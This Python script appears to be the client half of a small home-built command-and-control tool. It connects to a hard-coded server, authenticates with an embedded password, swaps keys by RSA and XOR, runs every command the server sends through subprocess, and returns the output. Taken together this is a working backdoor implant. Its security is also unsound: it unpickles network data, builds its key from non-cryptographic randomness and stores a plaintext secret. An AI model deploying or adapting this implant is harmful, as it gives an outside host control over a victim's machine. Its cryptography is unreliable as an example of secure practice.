import socket, hashlib, sys, string, random, subprocess, pickle
from itertools import cycle
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

server = "192.168.0.5"                  # Using this locally
# server_fqdn = "example.com"           # Use this if server.py running on public IP
# server = socket.gethostbyname(server_fqdn)
port = 1234
password = "g&*84Ads#4@11>?,.YqP[+0HgXvRwt"
failed_auth = "[+] Authentication failed"
end_byte = b"\x90"

def create_socket(server_ip: str, server_port: int) -> socket:
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((server_ip,server_port))
    return conn

def recv_until(socket: socket) -> bytes:
    end_byte = b"\x90"
    received = b""
    while end_byte not in received:
        received += socket.recv(1)
    return received[:-1]

def create_sym_key() -> bytes:
    printable_chars = list(string.printable)
    sym_key = b""
    while len(sym_key) < 30:
        sym_key += bytes(random.choice(printable_chars),"utf-8")
    return sym_key

def encrypt_w_sym(key: bytes, msg: bytes) -> bytes:
    enc_msg = bytes([k ^ m for k,m in zip(key,msg)])
    return enc_msg

def decrypt_w_sym(key: bytes, msg: bytes) -> str:
    dec_msg = bytes([k ^ m for k,m in zip(key,msg)])
    return dec_msg

def stretch_sym_key(key: str, msg: bytes) -> bytes:
    stretched_key = ""
    cycled_key = cycle(key)
    for i in cycled_key:
        if len(stretched_key) < len(msg):
            stretched_key += i
        else:
            return bytes(stretched_key,"utf-8")

def encrypt_data_w_asym(sym_key: str, public_key: bytes) -> bytes:
    encrypted_key = public_key.encrypt(
        sym_key,
        padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    ))
    return encrypted_key

def run_commands(data: dict) -> dict:
    results = {}
    print("[+] Running Commands....")
    for key,command in data.items():
        try:
            result = subprocess.run(command, text=True, capture_output=True, check=False)
            results[key] = result.stdout
        except:
            continue
    return results

def main(passw: str, failed_msg: str) -> None:

    # Hashing password
    passwd_hash = hashlib.sha256(passw.encode("utf-8")).hexdigest()

    # Creating socket and making intital connection to server
    s = create_socket(server, port)

    # Obtaining Password Query; If successful, respond with password hash
    recv = s.recv(1024)
    if recv:
        s.sendall(bytes(passwd_hash,"utf-8"))
    else:
        print(f"[+] Failed to receive authentication query.")
        sys.exit()

    # Check if authentication successful; If not, exit
    recv2 = s.recv(2048)
    if recv2.decode("utf-8") == failed_msg:
        print("[+] Authentication Failed. Wrong password.")
        sys.exit()

    # Desrialized public key
    public_key = serialization.load_pem_public_key(recv2)

    # Creating Symmetric key
    sym_key = create_sym_key()

    # Encrypting Symmetric Key for transport with Asymmetric Key
    encrypted_key = encrypt_data_w_asym(sym_key, public_key)

    # Sending over sym key
    s.sendall(encrypted_key)

    # Receiving commands from server
    enc_command = recv_until(s)

    # Stretching sym key for decryption
    stretched_key = stretch_sym_key(sym_key.decode("utf-8"), enc_command)

    # Decrypting commands
    decr_command = decrypt_w_sym(stretched_key, enc_command)

    # Unpacking pickled object
    unpickled = pickle.loads(decr_command)

    # Running commands received from server
    results = run_commands(unpickled)

    # Packing the results for transport
    pickled_results = pickle.dumps(results)

    # Creating stretched key for encryption
    l_stretched_key = stretch_sym_key(sym_key.decode("utf-8"), pickled_results)

    # Encrypting results for transport
    enc_results = encrypt_w_sym(l_stretched_key, pickled_results)

    # Sending results back to server
    s.sendall(enc_results + end_byte)
    print("[+] Sent Results")

if __name__ == "__main__":
    main(password, failed_auth )
